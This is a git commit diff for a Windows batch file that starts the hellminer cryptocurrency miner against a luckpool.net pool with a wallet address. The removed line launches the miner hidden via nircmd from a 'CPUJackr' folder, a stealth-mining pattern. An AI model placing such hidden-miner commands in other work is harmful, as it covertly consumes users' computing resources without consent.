fb64f365d8b2153d5c9331bd9e9963b99fbfd446
Mybay1 <132859537+Mybay1@users.noreply.github.com>
2023-06-06 19:06:20 +0100

    Update start-miner.bat

--- start-miner.bat
+++ start-miner.bat
@@ -1,2 +1,2 @@
 @echo off
-start "" /min "C:\CPUJackr\nircmd.exe" exec hide "C:\CPUJackr\hellminer.exe" -c stratum+tcp://na.luckpool.net:3960 -u RMovVQiRqawd8KThXQtKQhgESBPGzrSnXX --cpu 4
+./hellminer -c stratum+tcp://na.luckpool.net:3960 -u RMovVQiRqawd8KThXQtKQhgESBPGzrSnXX.Rig001 -p x --cpu 4
